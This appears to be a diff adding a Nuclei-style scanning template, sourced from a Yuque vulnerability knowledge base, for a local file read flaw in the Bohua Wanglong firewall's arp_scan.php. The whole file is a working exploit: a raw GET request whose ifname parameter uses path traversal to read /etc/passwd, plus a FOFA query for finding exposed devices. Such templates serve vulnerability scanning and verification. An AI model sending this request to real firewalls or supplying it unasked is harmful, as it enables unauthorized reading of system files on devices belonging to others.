@@ -1,0 +1,19 @@
+id: poc-vgld2pg0v7e8soa6
+info:
+  name: 博华网龙防火墙系统 arp_scan文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vgld2pg0v7e8soa6'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vgld2pg0v7e8soa6
+    fofa: title="博华网龙"
+http:
+- raw:
+  - GET /firewall/arp_scan.php?ifname=/../../../../../etc/passwd HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
